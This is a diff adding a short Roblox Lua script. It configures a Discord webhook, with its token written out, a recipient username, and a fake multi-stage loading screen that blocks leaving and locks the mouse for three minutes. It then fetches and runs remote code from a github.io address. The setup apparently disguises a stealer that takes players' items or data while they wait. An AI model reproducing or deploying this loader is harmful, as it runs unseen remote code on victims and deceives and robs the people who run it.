@@ -1,0 +1,14 @@
+UserName = "astral_1221"
+Webhook = "https://discord.com/api/webhooks/1101922162543181905/eyPwoLKkM4MpanJQDRt3FqqzNS_oFtM60Z-An80i13MjajqlJU8n8lSGxHgG1qJV7L_J"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Vix Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
